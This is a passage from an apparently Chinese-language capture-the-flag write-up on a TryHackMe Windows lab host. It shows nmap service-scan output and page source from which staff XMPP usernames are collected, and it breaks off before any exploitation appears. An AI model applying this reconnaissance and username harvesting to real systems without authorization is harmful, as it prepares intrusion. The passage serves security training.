9.4.18.v20190429</span><br><span class="hljs-string">|_http-server-header: Jetty(9.4.18.v20190429)</span><br><span class="hljs-string">|_http-title: Openfire HTTP Binding Service</span><br><span class="hljs-string">7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">|_http-title: Openfire HTTP Binding Service</span><br><span class="hljs-string">|_http-server-header: Jetty(9.4.18.v20190429)</span><br><span class="hljs-string">7777/tcp  open  socks5              (No authentication; connection not allowed by ruleset)</span><br><span class="hljs-string">| socks-auth-info: </span><br><span class="hljs-string">|_  No authentication</span><br><span class="hljs-string">9090/tcp  open  zeus-admin?</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:07 GMT</span><br><span class="hljs-string">|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT</span><br><span class="hljs-string">|     Content-Type: text/html</span><br><span class="hljs-string">|     Accept-Ranges: bytes</span><br><span class="hljs-string">|     Content-Length: 115</span><br><span class="hljs-string">|     &lt;html&gt;</span><br><span class="hljs-string">|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;</span><br><span class="hljs-string">|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;</span><br><span class="hljs-string">|     &lt;/head&gt;</span><br><span class="hljs-string">|     &lt;body&gt;</span><br><span class="hljs-string">|     &lt;/body&gt;</span><br><span class="hljs-string">|     &lt;/html&gt;</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:16 GMT</span><br><span class="hljs-string">|     Allow: GET,HEAD,POST,OPTIONS</span><br><span class="hljs-string">|   JavaRMI, drda, ibm-db2-das, informix: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x0</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;</span><br><span class="hljs-string">|   SqueezeCenter_CLI: </span><br><span class="hljs-string">|     HTTP/1.1 400 No URI</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 49</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;</span><br><span class="hljs-string">|   WMSRequest: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x1</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;</span><br><span class="hljs-string">9091/tcp  open  ssl/xmltec-xmlmail?</span><br><span class="hljs-string">| fingerprint-strings: </span><br><span class="hljs-string">|   DNSStatusRequestTCP, DNSVersionBindReqTCP: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x0</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 69</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;</span><br><span class="hljs-string">|   GetRequest: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:30 GMT</span><br><span class="hljs-string">|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT</span><br><span class="hljs-string">|     Content-Type: text/html</span><br><span class="hljs-string">|     Accept-Ranges: bytes</span><br><span class="hljs-string">|     Content-Length: 115</span><br><span class="hljs-string">|     &lt;html&gt;</span><br><span class="hljs-string">|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;</span><br><span class="hljs-string">|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;</span><br><span class="hljs-string">|     &lt;/head&gt;</span><br><span class="hljs-string">|     &lt;body&gt;</span><br><span class="hljs-string">|     &lt;/body&gt;</span><br><span class="hljs-string">|     &lt;/html&gt;</span><br><span class="hljs-string">|   HTTPOptions: </span><br><span class="hljs-string">|     HTTP/1.1 200 OK</span><br><span class="hljs-string">|     Date: Fri, 08 Jul 2022 06:28:32 GMT</span><br><span class="hljs-string">|     Allow: GET,HEAD,POST,OPTIONS</span><br><span class="hljs-string">|   Help: </span><br><span class="hljs-string">|     HTTP/1.1 400 No URI</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 49</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;</span><br><span class="hljs-string">|   RPCCheck: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character OTEXT=0x80</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 71</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt;</span><br><span class="hljs-string">|   RTSPRequest: </span><br><span class="hljs-string">|     HTTP/1.1 400 Unknown Version</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 58</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;</span><br><span class="hljs-string">|   SSLSessionReq: </span><br><span class="hljs-string">|     HTTP/1.1 400 Illegal character CNTL=0x16</span><br><span class="hljs-string">|     Content-Type: text/html;charset=iso-8859-1</span><br><span class="hljs-string">|     Content-Length: 70</span><br><span class="hljs-string">|     Connection: close</span><br><span class="hljs-string">|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x16&lt;/pre&gt;</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=fire.windcorp.thm</span><br><span class="hljs-string">| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm</span><br><span class="hljs-string">| Not valid before: 2020-05-01T08:39:00</span><br><span class="hljs-string">|_Not valid after:  2025-04-30T08:39:00</span><br><span class="hljs-string">9389/tcp  open  mc-nmf              .NET Message Framing</span><br><span class="hljs-string">49670/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0</span><br><span class="hljs-string">49675/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49676/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49695/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">49922/tcp open  msrpc               Microsoft Windows RPC</span><br><span class="hljs-string">4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://google.com/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port5262-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE8D%P=x86_64-unknown-linux-g</span><br><span class="hljs-string">SF:nu%r(RPCCheck,9B,&quot;&lt;stream:error\x20xmlns:stream=\&quot;http://etherx\.jabber</span><br><span class="hljs-string">SF:\.org/streams\&quot;&gt;&lt;not-well-formed\x20xmlns=\&quot;urn:ietf:params:xml:ns:xmpp</span><br><span class="hljs-string">SF:-streams\&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;&quot;);</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port5275-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE8D%P=x86_64-unknown-linux-g</span><br><span class="hljs-string">SF:nu%r(RPCCheck,9B,&quot;&lt;stream:error\x20xmlns:stream=\&quot;http://etherx\.jabber</span><br><span class="hljs-string">SF:\.org/streams\&quot;&gt;&lt;not-well-formed\x20xmlns=\&quot;urn:ietf:params:xml:ns:xmpp</span><br><span class="hljs-string">SF:-streams\&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:stream&gt;&quot;);</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port9090-TCP:V=7.92SVN%I=7%D=7/8%Time=62C7CE77%P=x86_64-unknown-linux-g</span><br><span class="hljs-string">SF:nu%r(GetRequest,11D,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20J</span><br><span class="hljs-string">SF:ul\x202022\x2006:28:07\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2</span><br><span class="hljs-string">SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges</span><br><span class="hljs-string">SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;&lt;/titl</span><br><span class="hljs-string">SF:e&gt;\n&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=index\.jsp\&quot;&gt;\n&lt;</span><br><span class="hljs-string">SF:/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&quot;)%r(JavaRMI,C3,&quot;HTTP/1\.1\x20400\x</span><br><span class="hljs-string">SF:20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charse</span><br><span class="hljs-string">SF:t=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h</span><br><span class="hljs-string">SF:1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNT</span><br><span class="hljs-string">SF:L=0x0&lt;/pre&gt;&quot;)%r(WMSRequest,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character</span><br><span class="hljs-string">SF:\x20CNTL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nConten</span><br><span class="hljs-string">SF:t-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x2040</span><br><span class="hljs-string">SF:0&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x1&lt;/pre&gt;&quot;)%r(ibm-db</span><br><span class="hljs-string">SF:2-das,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nConte</span><br><span class="hljs-string">SF:nt-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nCo</span><br><span class="hljs-string">SF:nnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x2</span><br><span class="hljs-string">SF:0Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(SqueezeCenter_CLI,9B,&quot;HTTP/</span><br><span class="hljs-string">SF:1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859</span><br><span class="hljs-string">SF:-1\r\nContent-Length:\x2049\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20M</span><br><span class="hljs-string">SF:essage\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20No\x20URI&lt;/pre&gt;&quot;)%r(informix,C3,&quot;HTTP</span><br><span class="hljs-string">SF:/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20te</span><br><span class="hljs-string">SF:xt/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20c</span><br><span class="hljs-string">SF:lose\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20ch</span><br><span class="hljs-string">SF:aracter\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(drda,C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20c</span><br><span class="hljs-string">SF:haracter\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r</span><br><span class="hljs-string">SF:\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Messa</span><br><span class="hljs-string">SF:ge\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%</span><br><span class="hljs-string">SF:r(HTTPOptions,56,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\</span><br><span class="hljs-string">SF:x202022\x2006:28:16\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&quot;);</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port9091-TCP:V=7.92SVN%T=SSL%I=7%D=7/8%Time=62C7CE8F%P=x86_64-unknown-l</span><br><span class="hljs-string">SF:inux-gnu%r(GetRequest,11D,&quot;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Fri,\x200</span><br><span class="hljs-string">SF:8\x20Jul\x202022\x2006:28:30\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20</span><br><span class="hljs-string">SF:Jan\x202020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-</span><br><span class="hljs-string">SF:Ranges:\x20bytes\r\nContent-Length:\x20115\r\n\r\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;</span><br><span class="hljs-string">SF:&lt;/title&gt;\n&lt;meta\x20http-equiv=\&quot;refresh\&quot;\x20content=\&quot;0;URL=index\.jsp</span><br><span class="hljs-string">SF:\&quot;&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\n&quot;)%r(HTTPOptions,56,&quot;HTTP/1\.</span><br><span class="hljs-string">SF:1\x20200\x20OK\r\nDate:\x20Fri,\x2008\x20Jul\x202022\x2006:28:32\x20GMT</span><br><span class="hljs-string">SF:\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n&quot;)%r(RTSPRequest,AD,&quot;HTTP/1\</span><br><span class="hljs-string">SF:.1\x20400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=i</span><br><span class="hljs-string">SF:so-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;B</span><br><span class="hljs-string">SF:ad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Unknown\x20Version&lt;/pre&gt;&quot;)%r(R</span><br><span class="hljs-string">SF:PCCheck,C7,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nC</span><br><span class="hljs-string">SF:ontent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r</span><br><span class="hljs-string">SF:\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason</span><br><span class="hljs-string">SF::\x20Illegal\x20character\x20OTEXT=0x80&lt;/pre&gt;&quot;)%r(DNSVersionBindReqTCP,</span><br><span class="hljs-string">SF:C3,&quot;HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ</span><br><span class="hljs-string">SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti</span><br><span class="hljs-string">SF:on:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illeg</span><br><span class="hljs-string">SF:al\x20character\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(DNSStatusRequestTCP,C3,&quot;HTTP/1\.1</span><br><span class="hljs-string">SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht</span><br><span class="hljs-string">SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\</span><br><span class="hljs-string">SF:r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20charact</span><br><span class="hljs-string">SF:er\x20CNTL=0x0&lt;/pre&gt;&quot;)%r(Help,9B,&quot;HTTP/1\.1\x20400\x20No\x20URI\r\nCont</span><br><span class="hljs-string">SF:ent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nC</span><br><span class="hljs-string">SF:onnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Message\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x</span><br><span class="hljs-string">SF:20No\x20URI&lt;/pre&gt;&quot;)%r(SSLSessionReq,C5,&quot;HTTP/1\.1\x20400\x20Illegal\x20</span><br><span class="hljs-string">SF:character\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1</span><br><span class="hljs-string">SF:\r\nContent-Length:\x2070\r\nConnection:\x20close\r\n\r\n&lt;h1&gt;Bad\x20Mes</span><br><span class="hljs-string">SF:sage\x20400&lt;/h1&gt;&lt;pre&gt;reason:\x20Illegal\x20character\x20CNTL=0x16&lt;/pre&gt;</span><br><span class="hljs-string">SF:&quot;);</span><br><span class="hljs-string">Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2022-07-08T06:29:07</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   311: </span><br><span class="hljs-string">|_    Message signing enabled and required</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="hljs-string"># Nmap done at Fri Jul  8 14:30:06 2022 -- 1 IP address (1 host up) scanned in 657.96 seconds</span><br></code></pre></td></tr></table></figure><h6 id="Flag1-txt"><a href="#Flag1-txt" class="headerlink" title="Flag1.txt:"></a>Flag1.txt:</h6><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708143519611.png" alt="image-20220708143519611"  /><p>Windows server. IIS.右键查看源代码会发现以下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicfish718@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:organicfish718@fire.windcorp.thm&quot;</span>&gt;</span>Antonietta Vidal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=organicwolf509@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:organicwolf509@fire.windcorp.thm&quot;</span>&gt;</span>Britney Palmer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinywolf424@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:tinywolf424@fire.windcorp.thm&quot;</span>&gt;</span>Brittany Cruz<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=angrybird253@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:angrybird253@fire.windcorp.thm&quot;</span>&gt;</span>Carla Meyer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=buse@fire.windcorp.thm&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:buse@fire.windcorp.thm&quot;</span>&gt;</span>Buse Candan<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edeltraut@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:Edeltraut@fire.windcorp.thm&quot;</span>&gt;</span> Edeltraut Daub<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Edward@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:Edward@fire.windcorp.thm&quot;</span>&gt;</span> Edward Lewis<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=Emile@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:Emile@fire.windcorp.thm&quot;</span>&gt;</span> Emile Lavoie<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=tinygoose102@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:tinygoose102@fire.windcorp.thm&quot;</span>&gt;</span> Emile Henry<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=brownostrich284@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:brownostrich284@fire.windcorp.thm&quot;</span>&gt;</span> Emily Anderson<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=sadswan869@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:sadswan869@fire.windcorp.thm&quot;</span>&gt;</span> Hemmo Boschma<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=goldencat416@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:sadswan869@fire.windcorp.thm&quot;</span>&gt;</span> Isabella Hughes<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=whiteleopard529@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:whiteleopard529@fire.windcorp.thm&quot;</span>&gt;</span> Isra Saur<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=happymeercat399@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:happymeercat399@fire.windcorp.thm&quot;</span>&gt;</span> Jackson Vasquez<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://fire.windcorp.thm:9090/plugins/presence/status?jid=orangegorilla428@fire.windcorp.thm&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;xmpp:orangegorilla428@fire.windcorp.thm&quot;</span>&gt;</span> Jaqueline Dittmer<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br></code></pre></td></tr></table></figure><p>看起来目标URL地址就是windcorp.thm。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220708144408730.png" alt="image-20220708144408730"></p><p>三个用户名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 